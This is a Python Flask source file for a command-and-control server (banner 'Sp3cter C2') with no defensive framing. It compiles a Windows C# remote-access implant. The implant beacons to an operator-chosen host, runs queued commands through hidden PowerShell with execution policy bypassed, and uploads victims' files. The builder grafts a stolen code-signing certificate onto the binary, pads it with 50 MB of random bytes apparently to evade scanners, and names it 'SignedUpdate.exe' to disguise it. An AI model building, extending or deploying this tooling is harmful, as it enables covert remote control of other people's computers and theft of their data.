from flask import Flask, render_template, request, send_file, jsonify, session, redirect, url_for
import base64, io, os, uuid, struct, subprocess, datetime, json, pefile, sys

app = Flask(__name__)
app.secret_key = os.urandom(24) 
agents = {}

BANNER = r"""
   _____ ____  _____   ______ ______ ______ ____ 
  / ___// __ \|__  /  / ____//_  __// ____// __ \
  \__ \/ /_/ / /_ <  / /      / /  / __/  / /_/ /
 ___/ / ____/___/ / / /___   / /  / /___ / _, _/ 
/____/_/    /____/  \____/  /_/  /_____//_/ |_|  
                                                  
      >> Shadow Command & Control System <<
"""


def hijack_and_fix_pe(template_bytes, target_path):
    temp_tpl = f"tpl_{uuid.uuid4().hex}.exe"
    try:
        with open(temp_tpl, "wb") as f: f.write(template_bytes)
        pe_template = pefile.PE(temp_tpl)
        sec_dir = pe_template.OPTIONAL_HEADER.DATA_DIRECTORY[pefile.DIRECTORY_ENTRY['IMAGE_DIRECTORY_ENTRY_SECURITY']]
        address, size = sec_dir.VirtualAddress, sec_dir.Size
        if address == 0 or size == 0:
            pe_template.close()
            return False
        with open(temp_tpl, "rb") as f:
            f.seek(address)
            cert_data = f.read(size)
        pe_template.close()
        with open(target_path, "rb") as f: target_data = bytearray(f.read())
        padding = (8 - (len(target_data) % 8)) % 8
        target_data.extend(b'\x00' * padding)
        new_cert_address = len(target_data)
        target_data.extend(cert_data)
        with open(target_path, "wb") as f: f.write(target_data)
        pe_target = pefile.PE(target_path)
        pe_target.OPTIONAL_HEADER.DATA_DIRECTORY[pefile.DIRECTORY_ENTRY['IMAGE_DIRECTORY_ENTRY_SECURITY']].VirtualAddress = new_cert_address
        pe_target.OPTIONAL_HEADER.DATA_DIRECTORY[pefile.DIRECTORY_ENTRY['IMAGE_DIRECTORY_ENTRY_SECURITY']].Size = size
        pe_target.OPTIONAL_HEADER.CheckSum = pe_target.generate_checksum()
        pe_target.write(target_path)
        pe_target.close()
        return True
    except: return False
    finally:
        if os.path.exists(temp_tpl): os.remove(temp_tpl)

def build_apt_exe(lhost, lport, template_file=None):
    temp_id = uuid.uuid4().hex[:6]
    cs_file, exe_file = f"core_{temp_id}.cs", f"bin_{temp_id}.exe"
    cs_source = f'''
    using System;
    using System.IO;
    using System.Diagnostics;
    using System.Net.Http;
    using System.Threading.Tasks;
    using System.Text;

    class Program {{
        static string aid = "{temp_id}";
        static string url = "http://{lhost}:{lport}/api/v1/beacon";
        static string lastOut = "";
        static string curDir = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
        static void Main() {{ try {{ Task.Run(() => RunBeacon()).Wait(); }} catch {{ }} }}
        static async Task RunBeacon() {{
            HttpClient client = new HttpClient();
            while(true) {{
                try {{
                    string json = "{{\\"id\\":\\"" + aid + "\\", \\"hostname\\":\\"" + Environment.MachineName + "\\"";
                    if (!string.IsNullOrEmpty(lastOut)) {{ json += ", \\"output\\":\\"" + lastOut + "\\""; lastOut = ""; }}
                    json += "}}";
                    var res = await client.PostAsync(url, new StringContent(json, Encoding.UTF8, "application/json"));
                    var resData = await res.Content.ReadAsStringAsync();
                    if (resData.Contains("||")) {{
                        string cmd = resData.Split(new string[] {{ "||" }}, 2, StringSplitOptions.None)[1];
                        if (cmd != "noop") {{
                            if (cmd.ToLower().StartsWith("download ")) lastOut = ExecuteDownload(cmd.Substring(9).Trim());
                            else lastOut = Execute(cmd);
                        }}
                    }}
                }} catch {{ }}
                await Task.Delay(5000);
            }}
        }}
        static string Execute(string cmd) {{
            try {{
                Process p = new Process();
                p.StartInfo.FileName = "powershell.exe";
                p.StartInfo.WorkingDirectory = curDir;
                string wrap = "$ErrorActionPreference='SilentlyContinue'; [Console]::OutputEncoding=[System.Text.Encoding]::UTF8; " + cmd + "; '---PATH---'; (Get-Location).Path";
                p.StartInfo.Arguments = "-NoP -Exec Bypass -Command \\"" + wrap.Replace("\\"", "\\\\\\"") + "\\"";
                p.StartInfo.RedirectStandardOutput = true; p.StartInfo.RedirectStandardError = true; p.StartInfo.UseShellExecute = false; p.StartInfo.CreateNoWindow = true;
                p.Start();
                string r = p.StandardOutput.ReadToEnd() + p.StandardError.ReadToEnd();
                if (r.Contains("---PATH---")) {{
                    string[] pts = r.Split(new string[] {{"---PATH---"}}, StringSplitOptions.None);
                    curDir = pts[1].Trim();
                    return Convert.ToBase64String(Encoding.UTF8.GetBytes(pts[0].Trim() + "---PATH---" + curDir));
                }}
                return Convert.ToBase64String(Encoding.UTF8.GetBytes(r));
            }} catch (Exception e) {{ return Convert.ToBase64String(Encoding.UTF8.GetBytes(e.Message)); }}
        }}
        static string ExecuteDownload(string p) {{
            try {{ 
                string fP = Path.IsPathRooted(p) ? p : Path.Combine(curDir, p);
                return "DOWNLOAD_DATA:" + Path.GetFileName(fP) + ":" + Convert.ToBase64String(File.ReadAllBytes(fP)); 
            }} catch {{ return ""; }}
        }}
    }}'''
    try:
        with open(cs_file, "w", encoding="utf-8") as f: f.write(cs_source)
        subprocess.run(["mcs", "-out:" + exe_file, "-target:winexe", cs_file, "-r:System.Net.Http.dll"], capture_output=True)
        with open(exe_file, "ab") as f: f.write(os.urandom(50 * 1024 * 1024))
        if template_file:
            hijack_and_fix_pe(template_file.read(), exe_file)
        with open(exe_file, "rb") as f: data = f.read()
        return data
    finally:
        if os.path.exists(cs_file): os.remove(cs_file)
        if os.path.exists(exe_file): os.remove(exe_file)



@app.before_request
def check_auth():

    allowed = ['login', 'static', 'beacon']
    if 'authenticated' not in session and request.endpoint not in allowed:
        return redirect(url_for('login'))

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        if request.form.get('password') == app.config['C2_PASSWORD']:
            session['authenticated'] = True
            return redirect(url_for('index'))
        return render_template('login.html', error="Invalid Password")
    return render_template('login.html')

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/generate', methods=['POST'])
def generate():
    lhost, lport = request.form.get('v_host'), request.form.get('v_port', '5000')
    template = request.files.get('template_file')
    bin_data = build_apt_exe(lhost, lport, template)
    return send_file(io.BytesIO(bin_data), as_attachment=True, download_name="SignedUpdate.exe")

@app.route('/api/v1/beacon', methods=['POST'])
def beacon():
   
    data = request.json
    if not data: return "shell||noop"
    aid = data.get('id')
    if aid not in agents: agents[aid] = {"ip": request.remote_addr, "hostname": data.get('hostname','...'), "queue":[], "results":[], "files":{}, "new_files":[]}
    agents[aid]["hostname"] = data.get('hostname', agents[aid]["hostname"])
    agents[aid]["last_seen"] = datetime.datetime.now().strftime("%H:%M:%S")
    if "output" in data:
        out = data["output"]
        if out.startswith("DOWNLOAD_DATA:"):
            parts = out.split(":", 2); agents[aid]["files"][parts[1]] = parts[2]; agents[aid]["new_files"].append(parts[1])
        else:
            try: agents[aid]["results"].append(base64.b64decode(out).decode('utf-8'))
            except: pass
    if agents[aid]["queue"]: return f"shell||{agents[aid]['queue'].pop(0)}"
    return "shell||noop"

@app.route('/api/v1/operator/list', methods=['GET'])
def list_agents(): return jsonify(agents)

@app.route('/api/v1/operator/push', methods=['POST'])
def push():
    data = request.json
    if data['id'] in agents: agents[data['id']]["queue"].append(data['cmd'])
    return jsonify({"status": "ok"})

@app.route('/api/v1/operator/results/<aid>', methods=['GET'])
def get_res(aid):
    if aid in agents:
        r, f = list(agents[aid]["results"]), list(agents[aid]["new_files"])
        agents[aid]["results"], agents[aid]["new_files"] = [], []
        return jsonify({"results": r, "files": f})
    return jsonify({"results": [], "files": []})

@app.route('/api/v1/operator/download_file/<aid>/<fn>', methods=['GET'])
def download_file(aid, fn):
    if aid in agents and fn in agents[aid]["files"]:
        return send_file(io.BytesIO(base64.b64decode(agents[aid]["files"][fn])), as_attachment=True, download_name=fn)
    return "Error", 404



if __name__ == '__main__':
    
    if len(sys.argv) < 2:
        print(f"\033[1;31m[!] Error: Debes especificar una contraseña.\nUso: python3 app.py <password>\033[0m")
        sys.exit(1)
    
    app.config['C2_PASSWORD'] = sys.argv[1]
    
    os.system('cls' if os.name == 'nt' else 'clear')
    print(f"\033[1;38;5;75m{BANNER}\033[0m")
    print(f"[*] Sp3cter C2 Core: ONLINE")
    print(f"[*] Password Set: {'*' * len(sys.argv[1])}")
    print(f"[*] Listen: http://0.0.0.0:5000\n")
    
    app.run(host='0.0.0.0', port=5000)
